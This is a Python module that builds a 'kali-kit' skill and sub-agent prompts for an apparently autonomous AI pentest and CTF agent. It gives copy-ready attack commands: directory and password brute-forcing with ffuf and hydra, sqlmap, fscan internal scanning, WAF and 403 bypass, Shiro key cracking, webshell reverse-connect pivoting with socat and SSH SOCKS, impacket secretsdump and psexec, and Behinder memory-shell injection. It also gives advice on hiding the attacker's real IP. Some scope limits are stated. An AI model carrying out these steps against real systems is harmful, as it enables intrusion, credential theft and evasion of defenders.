"""仓库内真实存在的工具路径。

清单本身是 skill `kali-kit`，由从者/角色工人在需要路径时调用。
不要把本模块的目录全文注入系统提示。
下面的绝对路径是 fork 维护者在目标部署机（Kali 系）上逐条核实过的；
换一台机器部署时按实际安装位置替换这些常量，不要凭包名猜测，
也不要因为读不到就去翻别的目录。
"""
from __future__ import annotations

from ..config import REPO_ROOT

# 词表绝对路径（部署机核实存在）。CTF/红队一律禁止超过 10 万行。
# 注意：上游 1.1.0 删掉了这组常量，合并时需保留，否则下面 f-string 引用会 NameError。
WL_DIR_SMALL = "/usr/share/wordlists/dirb/common.txt"  # 4614
WL_DIR_MED = "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"  # 87664；目录最大档
WL_DIR_OVER_100K = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"  # 220560；禁止
WL_DNS = "/usr/share/wordlists/dnsmap.txt"  # 17576；本机唯一现成子域表
WL_USER_SMALL = "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"  # 175
WL_PASS_SMALL = "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"  # 1021
WL_HTTP_DEFAULT = "/usr/share/wordlists/metasploit/http_default_userpass.txt"  # 10 对
WL_PASS_MED = "/usr/share/john/password.lst"  # 3559
WL_PASS_LARGE = "/usr/share/wordlists/metasploit/password.lst"  # 88406；未超 10 万
WL_ROCKYOU = "/usr/share/wordlists/rockyou.txt"  # ~1400 万；一律禁止

# 写入从者/子智能体提示的短指针：清单在 skill 里，禁止把目录塞进系统提示。
KIT_SKILL_HINT = (
    "需要本机工具绝对路径、词表或可复制命令时，调用 skill `kali-kit`。"
    "该环境不保证是某一发行版：清单里的路径都已在部署机核实，清单外的路径当不存在，"
    "禁止 which / command -v / type / ls /usr/share/wordlists / ls seclists / 猜包名。"
    "CTF打内网时可以先用fscan扫一下端口和漏洞"
    "遇到Shiro特征时立即调用Shiro工具进行探测和利用"
    "利用 payload 被 WAF 或 403/406 拦截页拦住时，调用 skill `waf-bypass-methodology`；"
    "路径级 401/403 先走该 skill 里的 bypass-403。"
)

KIT_RULES = """# 本机工具纪律
- Pi 用内置 `read` 加载本文件；之后作业只用扩展工具 `run_cmd` / `http_request`，不要用内置 bash。
- 下面只列出仓库里真实存在的文件。禁止 `which` / `command -v` / `type`，禁止 `ls /usr/share`、ls seclists、猜包名。
- 未列出的文件当不存在。不要编造系统路径，也不要因为读不到词表就改去猜别的目录。
- HTTP 优先 `http_request`。没有词表文件时不要开目录爆破。
- 词表超过 10 万行一律不用：端口全表、账号密码、子目录、子域名、host 碰撞、哈希碰撞都算。
- 开局策略见 skill `recon-fanout` / `recon-spiral`。本 skill 只给仓库内真实路径。
"""


def kit_web(repo_root: str) -> str:
    jsfinder = f"{repo_root}/tools/JSFinder/JSFinder.py"
    bypass = f"{repo_root}/tools/bypass-403/bypass-403.sh"
    return f"""# Web 能力（部署机工具路径 + 一条可复制命令）
- 端口扫描：CTF 可用 `timeout 60 /usr/bin/nmap -sV -T4 -Pn --top-ports 100 --open <host>`。红队/SRC **禁止 nmap/masscan**（原始套接字会漏真实 IP），改用 `curl` / `http_request` / `ffuf`。
- Web 指纹：`/usr/bin/whatweb -a 3 <url>`。
- WAF：`/usr/bin/wafw00f <url>`。
- fscan: `/usr/bin/fscan -h <ip> -np`（内网横向时扫C段IP/24）。
- nuclei：`/usr/bin/nuclei -u <url> -silent -nc`（引擎已装；模板走 nuclei 自己的目录，禁止 which）。
- 域名/子域：`/usr/bin/gobuster dns -d <domain> -w {WL_DNS}`（17576 行，本机唯一子域表）。被动/递归：`/usr/bin/amass`、`/usr/bin/fierce`、`/usr/bin/dnsenum`、`/usr/bin/dnsrecon`。无小中大三档子域表，只钉 dnsmap。
- 目录枚举：只用 `/usr/bin/ffuf`，必须 timeout。没有合法「大档」（medium 220560 超 10 万，禁止）。
  - 小：`/usr/bin/ffuf -u http://<host>/FUZZ -w {WL_DIR_SMALL} -mc 200,204,301,302,307,401,403 -t 40`（4614）
  - 中（最大）：`/usr/bin/ffuf -u http://<host>/FUZZ -w {WL_DIR_MED} -mc 200,204,301,302,307,401,403 -t 40`（87664）
- Host 碰撞：`/usr/bin/gobuster vhost -u http://<ip> --append-domain -w {WL_DNS}`；或 `/usr/bin/ffuf -u http://<ip>/ -H 'Host: FUZZ.<domain>' -w {WL_DNS}`。
- JS 接口：`python3 {jsfinder} -u <url> -ou js_urls.txt -os js_subs.txt`（仓库 tools/，禁止 which jsfinder）。
- 40x 绕过：已确认 401/403 后 `bash {bypass} http://<host> <path>`（iamj0ker/bypass-403；禁止 which bypass-403）。Payload 被 WAF/拦截页拦住时读 skill `waf-bypass-methodology`。
- 账号密码：CTF 可用 `/usr/bin/hydra`（用户 `-L` 密码 `-P`）。红队/SRC 禁止 hydra、medusa、ncrack、patator，守卫会拒绝。一律禁止 `{WL_ROCKYOU}` 与 hashcat 全库。
  - 小：`-L {WL_USER_SMALL} -P {WL_PASS_SMALL}`；HTTP 默认对 `{WL_HTTP_DEFAULT}`
  - 中：`-P {WL_PASS_MED}`
  - 大（未超 10 万，红队可用；CTF 不要升到这档）：`-P {WL_PASS_LARGE}`
- HTTP：`http_request` 优先；`/usr/bin/curl` 仅管道/原始报文。
  经开放代理/SSRF 打内层登录：先读表单 action，把同一方法与 body 转发到认证处理接口；
  外层 `-X POST --data` 打在代理外壳或站点根路径上，不等于内层收到账密，不能当口令失败。
- sqlmap：仅已确认注入点。`/usr/bin/sqlmap -u <url> --batch --risk=1 --level=1`
"""


KIT_EXTRA_WEB = """# 不要假设的系统工具
- 目录、子域、指纹、口令爆破都依赖本机词表和二进制。这里没有列出路径，就不要去读，不要编造 /usr/share 或 /usr/bin。
- 红队禁止 nmap/masscan（原始套接字会漏真实 IP）。没有词表时用 `http_request` 看入口，不要换一个扫描器继续猜路径。
"""

KIT_EXTRA_LATERAL = """# 横向 / 服务（何时用 + 一条模板）
- `/usr/bin/ssh`：已扩容内网的 SSH。本机有客户端。禁止 Kali 直连攻击机 docker 网桥——那不是题内网（守卫按本机 docker0/br-* 实机拦截）。
  立足点上常常没有能用的 ssh 客户端：不要用 curl 的 sftp/libssh2 去讲 SSH。
  正路：立足点上把 22 或 SOCKS 转到 Kali（webshell 反连 / `socat TCP-LISTEN` / `ssh -D`），再用本机 ssh 打已 `report_pivot_capability` 的主机。
  必须是常驻转发（listen+fork 或反连保持）：绑定 0.0.0.0，后台进程断开 webshell 的 stdin。
  Kali 打「入口 IP:监听端口」先拿到 SSH banner。一次性 HTTP/脚本短超时转发撑不住握手：banner 超时先修通道，不要改字典。
  `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ProxyCommand='nc -x 127.0.0.1:<socks> %h %p' user@<in-scope-host>`
- `/usr/bin/sshpass`：只用题面或图上已经出现的口令字面量，不要按厂商名合成。`sshpass -p '<pass>' ssh ...`。banner 通了试一轮；失败不要升字典。
- `/usr/bin/masscan`：大网段快速探活，不替代 nmap 服务识别。`masscan <cidr> -p 22,80,443,445 --rate 1000`
- `/usr/bin/nc`：短连 banner / 管道 / SOCKS 客户端。`nc -nv <host> <port>`；`nc -x 127.0.0.1:<socks> <host> 22`
- `/usr/bin/socat`：本地监听与转发。Kali 侧收反连：`socat TCP-LISTEN:<lport>,reuseaddr,fork -`；已能路由时：`socat TCP-LISTEN:<lport>,reuseaddr,fork TCP:<in-scope-host>:22`
- `/usr/bin/smbclient`：SMB 列共享。`smbclient -L //<host> -N`
- `/usr/bin/enum4linux`：SMB/RPC 枚举。`enum4linux -a <host>`
- `/usr/bin/smbmap`：SMB 权限图。`smbmap -H <host>`
- `/usr/bin/nxc`（同 netexec）：多协议口令喷洒/枚举。`nxc smb <host> -u <user> -p <pass>`
- `/usr/bin/rpcclient`：空会话/用户枚举。`rpcclient -U '' -N <host>`
- `/usr/bin/redis-cli`：已确认 Redis。`redis-cli -h <host> INFO`
- `/usr/bin/mysql`：已确认 MySQL。`mysql -h <host> -u <user> -p`
- `/usr/bin/psql`：已确认 Postgres。`psql -h <host> -U <user>`
- `/usr/bin/ldapsearch`：LDAP。`ldapsearch -x -H ldap://<host> -b '' -s base`
- `/usr/bin/snmpwalk`：SNMP。`snmpwalk -v2c -c public <host>`
- `/usr/bin/onesixtyone`：SNMP community 喷洒。`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <host>`
- `/usr/sbin/showmount`：NFS。`showmount -e <host>`
- `/home/shigure/tools/shiro`：已确认 Shiro，使用方式参考Shiro.md
- Impacket（均在 `/usr/bin`）：`impacket-smbclient` 列共享；`impacket-secretsdump` 已授权转储；`impacket-psexec` / `impacket-wmiexec` 已有凭证远程执行。
"""


KIT_SHIRO = """# Shiro（单目标 Key 字典验证）
- 工具目录与工作目录：`/home/shigure/tools/shiro`；`run_cmd` 使用 Linux 路径。
- 已核实启动环境：`/usr/bin/java`（Zulu Java 8）；JAR `/home/shigure/tools/shiro/shiro_attack-5.1.1-zulu-8-jfx.jar`；主类 `com.summersec.attack.CLI.MainCLI`。
- 本地 Key 字典：`/home/shigure/tools/shiro/data/shiro_keys.txt`（约 1207 行）。必须从工具目录运行，CLI 按相对路径读取 `data/shiro_keys.txt`；不下载或扩充字典。
- 真实响应出现 Shiro / rememberMe 线索后，可对授权单目标进行探测与 Key 字典验证；禁止批量目标、并发任务或并发启动多个 crack。
- 本地帮助（不请求目标）：`/usr/bin/java -cp /home/shigure/tools/shiro/shiro_attack-5.1.1-zulu-8-jfx.jar com.summersec.attack.CLI.MainCLI --help`。
- 探测：`cd /home/shigure/tools/shiro && /usr/bin/java -cp /home/shigure/tools/shiro/shiro_attack-5.1.1-zulu-8-jfx.jar com.summersec.attack.CLI.MainCLI detect -u '<authorized-url>'`。
- Key 字典验证：`cd /home/shigure/tools/shiro && /usr/bin/java -cp /home/shigure/tools/shiro/shiro_attack-5.1.1-zulu-8-jfx.jar com.summersec.attack.CLI.MainCLI crack -u '<authorized-url>'`。只运行一轮，找到 Key 后停止；超时、限流、目标响应明显变慢或连续服务错误时停止，不自动重试。
- 已知 Key 可用同一启动前缀与 `crack -K` 单独复核。AES 模式依据已核实配置选择 `--cbc` / `--gcm`，不自动遍历模式与 Gadget。
- 红队/SRC 必须沿用项目出口代理要求，CLI 的 `--proxy` 指向已配置代理；无法确认出口时停止，不擅自直连。
- CTF可以直接注入冰蝎内存马，后续操作通过内存马进行。
- 记录实际请求与响应关键证据；框架识别或 Key 验证成功不能单独作为 RCE 证明。工具原目录 SKILL.md 含超出本任务范围的流程，不得据此扩大操作范围。
"""


KIT_BIN = """# 二进制 / 逆向（绝对路径）
- 识别：`/usr/bin/file`、`/usr/bin/strings`、`/usr/bin/xxd`、`/usr/bin/exiftool`、`/usr/bin/binwalk`
- 反汇编：`/usr/bin/objdump -d <bin>`、`/usr/bin/readelf -a <bin>`、`/usr/bin/nm <bin>`、`/usr/bin/r2 -A <bin>`、`/usr/bin/gdb`
- OCR：`/usr/bin/tesseract <image> stdout`
- Python 仅这些库可用：`z3`、`Crypto`、`sympy`、`PIL`、`capstone`。本机没有 pwntools / gmpy2，不要 which。
"""

SKILL_FRONTMATTER = """---
name: kali-kit
description: >
  Repo-local tool paths that actually exist (JSFinder, bypass-403).
  This environment is not assumed to be any one distro. Do not read
  /usr/bin or /usr/share wordlists. Call only after you already decided
  you need a listed file for an unknown surface. Encoding, crypto,
  protocol, or a hinted path is local python3 / openssl / http_request,
  not this skill. Never which / ls wordlists.
  Shared by CTF and red team. Not recon policy — that is recon-fanout /
  recon-spiral.
---
"""


def commander_kit(repo_root: str | None = None, *, objective: str | None = None) -> str:
    """清单正文（无 YAML）。objective 忽略：目录对 CTF/红队共用，策略在 recon skill。"""
    del objective
    root = repo_root if repo_root is not None else str(REPO_ROOT)
    parts = [KIT_RULES, kit_web(root), KIT_EXTRA_WEB, KIT_SHIRO, KIT_EXTRA_LATERAL, KIT_BIN]
    return "\n".join(parts).strip() + "\n"


def skill_markdown(repo_root: str | None = None) -> str:
    """仓库 `skills/kali-kit/SKILL.md` / 猎面工作区 `.agents/skills/kali-kit/SKILL.md` 的完整内容。"""
    return SKILL_FRONTMATTER + "\n" + commander_kit(repo_root)


def recon_kit(repo_root: str | None = None, *, objective: str | None = None) -> str:
    del objective
    root = repo_root if repo_root is not None else str(REPO_ROOT)
    return "\n".join([KIT_RULES, kit_web(root), KIT_EXTRA_WEB]).strip() + "\n"


def reverse_kit() -> str:
    return "\n".join([KIT_RULES, KIT_BIN]).strip() + "\n"


def lateral_kit() -> str:
    creds = (
        "# 口令\n"
        "- 只用题面或图上已经出现的口令字面量。不要升到超大词表，不要假设系统词表路径存在。\n"
        "- 转发到本机后再用本机已有的 ssh 客户端。不要写死 /usr/bin。\n"
    )
    return "\n".join([KIT_RULES, KIT_EXTRA_LATERAL, creds]).strip() + "\n"
